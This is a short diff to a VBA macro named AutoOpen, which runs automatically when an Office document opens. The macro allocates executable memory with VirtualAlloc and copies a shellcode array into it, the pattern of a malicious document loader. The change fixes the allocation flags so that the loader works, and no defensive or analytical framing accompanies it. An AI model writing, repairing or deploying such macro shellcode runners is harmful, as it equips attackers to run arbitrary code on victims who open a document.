@@ -26,7 +26,7 @@ Sub AutoOpen()
 
   ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
   ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
-  addr = VirtualAlloc(0, UBound(shellcode), &H1000, &H40)
+  addr = VirtualAlloc(0, UBound(shellcode), &H3000, &H40)
 
   For counter = LBound(shellcode) To UBound(shellcode)
     data = shellcode(counter)
